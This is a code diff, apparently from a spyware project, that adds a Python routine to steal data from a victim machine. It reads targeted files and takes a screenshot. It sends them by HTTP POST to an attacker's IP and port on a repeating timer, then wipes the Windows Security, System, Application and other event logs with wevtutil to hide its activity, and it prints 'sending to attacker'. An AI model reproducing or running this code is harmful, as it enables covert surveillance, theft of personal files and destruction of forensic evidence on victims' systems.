@@ -39,4 +39,59 @@ def send_post_req():
         #format content of files into the payload
         for file in targeted_files:
                 content=open(file, "rb")
-                payload+=b"\n
+                payload+=b"\nfile : "+file.encode()+b"\n"+content.read()+b"\\End"+b"OfFile"
+                content.close()
+                print(file.encode()+b" processed")
+
+        #add screenshot, png is being a b*tch, sending it separetly
+        screenshot = pyautogui.screenshot("img.png") #take screenshot and save it to img.png
+        print("created img.png !")
+        content_from_screen=open("img.png","rb")
+
+        payload+=b"\nfile : "+b"img.png"+b"\n"
+        payload+=content_from_screen.read()   #idk why but it wasn't working as a one liner
+        payload+=b"\\End"+b"OfFile"
+
+        print("img.png processed !")
+        content_from_screen.close()
+
+        # We send the POST Request to the server with ip address which listens on the port as specified in the server code.
+        r = requests.post(f"http://{ip_address}:{port_number}", data=payload)
+
+        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
+        timer = threading.Timer(time_interval, send_post_req)
+
+        # We start the timer thread.
+        timer.start()
+
+        #clean after everytime we interact
+        os.remove("img.png")
+        clean_logs()
+
+    except Exception as e:
+
+        print("Couldn't complete request!")
+        print(e)
+
+
+
+def clean_logs():
+
+        eventlogs = ['Security' , 'Application' , 'System' , 'Setup', 'Internet Explorer']
+
+
+        for event in eventlogs:
+                try:
+                        check_output(["wevtutil.exe" , "cl" , event.strip("\r")])
+                        print("Logs Deleted Successfully .\n".format(event))
+                except:
+                        print("Failure to delete logs.\n".format(event))
+
+
+
+
+
+
+
+print("sending to attacker")
+send_post_req()
